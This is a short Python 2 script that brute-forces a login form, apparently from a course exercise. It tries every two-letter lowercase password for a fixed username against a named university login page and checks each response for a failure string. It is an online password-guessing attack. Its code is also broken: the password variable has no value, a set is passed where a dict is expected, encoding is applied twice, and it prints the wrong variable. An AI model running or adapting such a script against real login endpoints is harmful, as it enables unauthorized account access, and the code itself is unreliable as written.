import urllib
import urllib2
import itertools
from cookielib import CookieJar

lower = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

cJar = CookieJar()
openThis = urllib2.build_opener(urllib2.HTTPCookieProcessor(cJar))
username = "jonathan1_-KnS"
password = 
for i in range(2,3):
    for j in itertools.product(lower,repeat=i):
        pasw = ''.join(j)

        params = urllib.urlencode({"", pasw})

        request = openThis.open("https://cs5339.cs.utep.edu/longpre/loginScreen.php",urllib.urlencode(params))
        respond = urllib2.urlopen(request)

        if(respond.read().find("Was not successful") == -1):
            print("password is: ",password)
